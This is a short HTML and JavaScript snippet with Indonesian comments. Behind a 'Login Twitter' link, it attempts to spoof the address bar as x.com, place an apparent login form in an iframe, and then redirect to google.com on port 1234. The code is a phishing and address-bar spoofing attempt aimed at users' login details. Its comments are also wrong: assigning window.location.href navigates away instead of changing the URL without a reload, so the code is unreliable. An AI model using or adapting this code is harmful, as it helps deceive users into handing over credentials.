<script>
  function next() {
    // Redirect ke halaman Google setelah pengalihan
    window.location.replace('https://www.google.com:1234');
  }

  function f() {
    // Mengubah alamat URL di address bar ke x.com tanpa mereload halaman
    window.location.href = "https://x.com";  // Alamat spoofed di address bar

    // Menampilkan iframe yang memuat login form (x.com atau lainnya)
    document.body.innerHTML = '<h2>Login via Iframe</h2>';
    document.body.innerHTML += '<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>';

    // Mengecek kondisi dan redirect setelah pengalihan
    setTimeout(function() {
      next();  // Setelah beberapa detik, alihkan ke halaman Google
    }, 5000); // Setelah 5 detik
  }
</script>

<a href="#" onclick="f()">Login Twitter</a>
